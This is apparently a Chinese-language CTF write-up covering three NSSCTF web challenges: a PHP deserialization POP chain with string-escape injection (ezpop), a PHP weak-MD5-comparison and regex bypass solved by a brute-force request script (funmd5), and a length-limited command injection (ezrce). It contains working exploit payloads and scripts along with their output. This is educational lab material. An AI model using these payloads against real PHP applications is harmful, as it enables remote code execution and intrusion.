<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key=<span class="string">&quot;UUCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;basedata = <span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"> O:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªç»“æœæ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œä½†æ˜¯åœ¨æœ€åçš„ä»£ç ä¸­<code>$data=serialize(new UUCTF($pdata));</code><br>è¿™é‡Œçš„<code>$pdata</code>æ§åˆ¶çš„æ˜¯nameï¼Œä½†æ˜¯ä¸ºäº†èƒ½å¤Ÿè°ƒç”¨evalå‡½æ•°ï¼Œå°±å¿…é¡»è®©basedataæ˜¯æˆ‘ä»¬ä¸Šé¢æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ï¼ŒUUCTFç±»çš„keyä¹Ÿå¿…é¡»æ˜¯â€UUCTFâ€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå­—ç¬¦é€ƒé€¸ã€‚<br>å­—ç¬¦ä¸²é€ƒé€¸åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br>åœ¨æœ€åçš„ä»£ç ä¸­å®è¡Œ<code>$data_replace=str_replace(&quot;hacker&quot;,&quot;loveuu!&quot;,$data);</code>æ¯æ¬¡ä¼šæŠŠhacker æ›¿æ¢æˆloveuu!  6ä¸ªå­—ç¬¦æ›¿æ¢æˆäº†7ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼å‰é¢çš„ä¸ªæ•°æ˜¯æ²¡å˜çš„ï¼Œæ›¿æ¢å°±ä¼šé•¿åº¦ä¸åŒ¹é…å¯¼è‡´ååºåˆ—åŒ–æ“ä½œå¤±è´¥<br>é¢˜ç›®ä¸­çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„åŸºæœ¬å½¢å¼æ˜¯<br>O:5:â€UUCTFâ€:4:{s:4:â€nameâ€;s:3:â€abcâ€;s:3:â€keyâ€;N;s:8:â€basedataâ€;N;s:2:â€obâ€;N;}<br>æˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰name<br>ä¸Šé¢æˆ‘ä»¬æ„é€ çš„ç¬¬äºŒä¸ªåºåˆ—åŒ–ç»“æœä¸­nameåé¢çš„æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">&quot;;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ¯”å¦‚ä¸€å…±æ˜¯262ä¸ªå­—ç¬¦ï¼ˆåé¢ç”¨strlenè®¡ç®—ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æœ‰ä¸€ä¸ªhackerå°±ä¼šè®©æ›¿æ¢åçš„å­—ç¬¦å¤š1ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ 262ä¸ªhacker<br><code>262+6*262=7*262=1834 </code><br>è¿˜è®°å¾—æˆ‘ä»¬æœ€å¼€å§‹æ„é€ UUCTFç±»çš„ç»“æœå—ï¼Œç°åœ¨æˆ‘ä»¬æ‹†æˆ3ä¸ªéƒ¨åˆ†</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#ç¬¬ä¸€éƒ¨åˆ†</span></span><br><span class="line">O<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;UUCTF&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span>&#123;s<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#ç¬¬äºŒéƒ¨åˆ†</span></span><br><span class="line">name</span><br><span class="line"></span><br><span class="line"><span class="meta">#ç¬¬ä¸‰éƒ¨åˆ†</span></span><br><span class="line"><span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>UUCTF<span class="string">&quot;;s:8:&quot;</span>basedata<span class="string">&quot;;s:164:&quot;</span>Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0<span class="punctuation">=</span><span class="string">&quot;;s:2:&quot;</span>ob<span class="string">&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘è¿™ä¹ˆæ‹†åˆ†çš„æ„ä¹‰ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯è®©nameå˜æˆæ›¿æ¢çš„hacker<br>æ›¿æ¢ä¹‹åå°±æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1834</span>:<span class="string">&quot;262 ä¸ª hacker&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125; s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ååºåˆ—åŒ–å‡½æ•°çœ‹åˆ°<code>ï¼›&#125; </code>å°±å½“ä½œç»“æŸç¬¦å·ï¼Œåé¢çš„éƒ½ä¼šå¿½ç•¥æ‰<br>å®Œæ•´çš„ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    public <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    public <span class="variable">$cmd</span>; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = new youwant();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = new output();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = new nothing();</span><br><span class="line"><span class="variable">$c</span>-&gt;a = &amp;<span class="variable">$c</span>-&gt;b;</span><br><span class="line"><span class="variable">$c</span>-&gt;t = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$basedata</span> = base64_encode(serialize(<span class="variable">$c</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post</span>=<span class="string">&#x27;&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:2:&quot;ob&quot;;N;s:8:&quot;basedata&quot;;s:&#x27;</span>.strlen(<span class="variable">$basedata</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$basedata</span>.<span class="string">&#x27;&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$hacker</span>=<span class="variable">$hacker</span>.<span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">echo <span class="variable">$hacker</span>.<span class="variable">$post</span>;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨postå‘é€dataæ•°æ®<br><img src="https://pic1.imgdb.cn/item/67b49075d0e0a243d400916a.png"><br>é‚£åªè¦æŠŠå‰é¢çš„ls æŒ‡ä»¤æ”¹æˆcat flagå‘½ä»¤å°±å¯ä»¥å¾—åˆ°flag ä½†æ˜¯è¿™é‡Œè¦ç”¨tac ä¸çŸ¥é“ä¸ºä»€ä¹ˆ<br>å‚è€ƒï¼š <a href="https://blog.csdn.net/weixin_73904941/article/details/143440458">[UUCTF 2022 æ–°ç”Ÿèµ›] ezpop è¯¦ç»†é¢˜è§£ (å­—ç¬¦ä¸²é€ƒé€¸)</a><br>è¿™é“é¢˜å‡ºçš„è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œå°±æ˜¯ååºåˆ—åŒ–é“¾å’Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åšå­—ç¬¦ä¸²é€ƒé€¸ï¼Œè¿™é“é¢˜è¿˜æ˜¯æŒºé€‚åˆå…¥é—¨çš„ï¼Œå€¼å¾—ç ”ç©¶<br>å­—ç¬¦å¢å¤šé€ƒé€¸ï¼šç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å¢å¤šï¼Œåå‡ºå¤šä½™ä»£ç ï¼ŒæŠŠå¤šä½™ä½ä»£ç æ„é€ æˆé€ƒé€¸çš„æˆå‘˜å±æ€§ï¼Œæ„é€ å‡ºä¸€ä¸ªé€ƒé€¸æˆå‘˜å±æ€§</p>
<p>å­—ç¬¦å‡å°‘é€ƒé€¸ï¼šç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å‡å°‘ï¼Œåƒæ‰æœ‰æ•ˆä»£ç ï¼Œåœ¨ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ„é€ ä»£ç ï¼Œå¤šé€ƒé€¸å‡ºä¸€ä¸ªæˆå‘˜å±æ€§</p>
<h1 id="funmd5"><a href="#funmd5" class="headerlink" title="funmd5"></a>funmd5</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$time</span>=<span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$guessmd5</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$md5</span>))&#123;</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$time</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$md5</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)0e(.*)$/&#x27;</span>,<span class="string">&#x27;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/0e/&#x27;</span>,<span class="variable">$md5</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$md5</span>[<span class="number">0</span>]=<span class="title function_ invoke__">substr</span>(<span class="variable">$md5</span>[<span class="number">0</span>],<span class="variable">$sub</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$md5</span>[<span class="number">0</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>[<span class="number">0</span>])&amp;&amp;<span class="variable">$md5</span>[<span class="number">1</span>]===<span class="variable">$guessmd5</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;well!you win again!now flag is yours.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$md5</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;oh!no!maybe you need learn more PHP!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is your md5:<span class="subst">$md5</span>[0]&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;maybe you need more think think!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„æ­£åˆ™æ˜¯è¿‡æ»¤äº†ç§‘å­¦è®¡æ•°æ³•ã€‚å¦‚æœ md5 ä»¥ 0e å½¢å¼å‡ºç°ï¼Œåˆ™æ›¿æ¢ 0e ä¸º no_science_notation!<br>$sub å– $time çš„æœ€åä¸€ä½æ•°å­—ã€‚<br>ç„¶ååˆ¤æ–­ <code>$md5[0]</code> æ˜¯å¦åŒ…å« 0eï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿›å…¥å¤„ç†é€»è¾‘ã€‚<br><code>$md5[0]</code> æˆªå– $sub ä½ç½®åçš„å­—ç¬¦ä¸²ã€‚<br><code> if($md5[0]==md5($md5[0])&amp;&amp;$md5[1]===$guessmd5)&#123;</code> å‰é¢ä¸€ä¸ªæ˜¯å¼±æ¯”è¾ƒ åé¢ä¸€ä¸ªæ˜¯ä¸¥æ ¼æ¯”è¾ƒ</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„md5è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶<br><code>md5[0] == md5(md5[0])</code><br>    éœ€è¦æ‰¾åˆ°ä¸€ä¸ª MD5 ç¢°æ’å€¼ï¼Œæ»¡è¶³ <code>md5($input)</code> ç”Ÿæˆ 0e å½¢å¼çš„å“ˆå¸Œå€¼ï¼Œä½¿ <code>md5($input)</code> &#x3D;&#x3D; $input æˆç«‹ã€‚<br><code>md5[1] === $guessmd5</code><br>    <code>$md5[1]</code>éœ€è¦ç­‰äº <code>md5($time)</code>ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
<p>è¿™éƒ¨åˆ†ç»™å‡ºäº†<code>$guessmd5</code>çš„å‰5ä½æ˜¯<code>4a175</code></p>
<p>ç°åœ¨ä¸€æ­¥æ­¥åˆ†æï¼Œ å¦‚æœè¦æ»¡è¶³<code>$md5[0]==md5($md5[0])</code> å¯ä»¥é€‰æ‹©<code>0e215962017</code>,ä½†æ˜¯åˆšæ‰è¯´æœ‰ä¸€ä¸ª0eçš„æ›¿æ¢<br>ç°åœ¨åˆ†æå¦‚æœç»•è¿‡<code>$md5=preg_replace(&#39;/^(.*)0e(.*)$/&#39;,&#39;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#39;,$md5);</code><br>å…ˆç†è§£è¿™ä¸ªæ­£åˆ™çš„æ›¿æ¢è§„åˆ™</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">åœ¨ Python æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ<span class="string">&quot;.&quot;</span> è¡¨ç¤ºåŒ¹é…é™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œ<span class="string">&quot;*&quot;</span> è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­—ç¬¦é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚å› æ­¤ï¼Œ<span class="string">&quot;.*&quot;</span> è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„å­—ç¬¦åºåˆ—ï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºè´ªå©ªåŒ¹é… <span class="punctuation">(</span>greedy matching<span class="punctuation">)</span>ã€‚</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ³¨æ„åˆ°è¿™ä¸ªé™¤äº†æ¢è¡Œç¬¦ä»¥å¤–ï¼Œå¦‚æœåœ¨0eä¹‹å‰æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œé‚£è¿™ä¸ªæ­£åˆ™å°±åŒ¹é…ä¸åˆ°äº†ï¼Œæ‰€ä»¥ç”¨<code>%0a0e215962017</code><br>ç„¶å<code>$md5[0]=substr($md5[0],$sub);</code>è¿™é‡Œä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥æˆªå–ï¼Œæ‰€ä»¥è®©<code>$sub</code>&#x3D; 1 å°±å¯ä»¥ç»•è¿‡<br>æœ€åä¸€ä¸ªæ»¡è¶³çš„æ¡ä»¶æ˜¯<code>$md5[1]===$guessmd5</code>  é‚£å°±å¯ä»¥ç”¨è„šæœ¬å‘é€è¯·æ±‚åŒ…ï¼Œç„¶åè®©md5ç¢°æ’ç›¸ç­‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures  //å¤šçº¿ç¨‹</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://node5.anna.nssctf.cn:24604/?md5[0]=%0a0e215962017&amp;md5[1]=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_md5</span>(<span class="params">t</span>):</span><br><span class="line">    md5_value = hashlib.md5(<span class="built_in">str</span>(t).encode()).hexdigest()</span><br><span class="line">    url = URL.<span class="built_in">format</span>(md5_value)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;win&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! Time: <span class="subst">&#123;t&#125;</span>, MD5: <span class="subst">&#123;md5_value&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_md5</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">        times_to_try = [current_time, current_time - <span class="number">1</span>, current_time + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">3</span>) <span class="keyword">as</span> executor:</span><br><span class="line">            results = executor.<span class="built_in">map</span>(check_md5, times_to_try)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(results):</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># å¦‚æœæˆåŠŸï¼Œåœæ­¢çˆ†ç ´</span></span><br><span class="line"></span><br><span class="line">guess_md5()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br><span class="line">(base) kakeru@bogon python % python -u <span class="string">&quot;/Users/kakeru/python/web/funmd5.py&quot;</span></span><br><span class="line">/Users/kakeru/Library/Python/<span class="number">3.9</span>/lib/python/site-packages/urllib3/__init__.py:<span class="number">35</span>: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL <span class="number">1.1</span><span class="number">.1</span>+, currently the <span class="string">&#x27;ssl&#x27;</span> module <span class="keyword">is</span> compiled <span class="keyword">with</span> <span class="string">&#x27;LibreSSL 2.8.3&#x27;</span>. See: https://github.com/urllib3/urllib3/issues/<span class="number">3020</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p><img src="https://pic1.imgdb.cn/item/67b72c59d0e0a243d4010ef4.png"><br>éšä¾¿è¾“å…¥ä¸€æ¡å‘½ä»¤ï¼Œè·³è½¬åˆ°post.php ç„¶åæç¤ºå‘½ä»¤å·²åœ¨.&#x2F;tmp&#x2F; ç›®å½•ä¸‹æˆåŠŸæ‰§è¡Œ<br>å‡†å¤‡è¾“å…¥<code>ping -c2 192.168.112.11 </code>éªŒè¯å‘½ä»¤æ˜¯å¦æ‰§è¡Œï¼Œä½†æ˜¯è¿”å›<code>ä½ ä¹Ÿå¤ªé•¿äº†å§ï¼Œåˆ é™¤ä½ çš„ tmp ç›®å½•äº†</code><br>ç„¶åå¯ä»¥é€æ¸å¢åŠ å‘½ä»¤é•¿åº¦ï¼Œæœ€ç»ˆå¾—å‡ºå‘½ä»¤é•¿åº¦çš„é™åˆ¶æ˜¯6<br>è¿™é‡Œè¦äº†è§£å‡ ä¸ªlinuxä¸­çš„çŸ¥è¯†ï¼Œ<code>*</code>ä¼šæŠŠç›®å½•ä¸­çš„ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ å‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°æ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">â””â”€<span class="meta"># &gt;nl</span></span><br><span class="line">^C                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">â””â”€<span class="meta"># ls</span></span><br><span class="line">nl                      </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">â””â”€<span class="meta"># &gt;a                 </span></span><br><span class="line">^C                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">â””â”€<span class="meta"># *</span></span><br><span class="line"><span class="symbol">a:</span> command not found</span><br></pre></td></tr></table></figure></div>
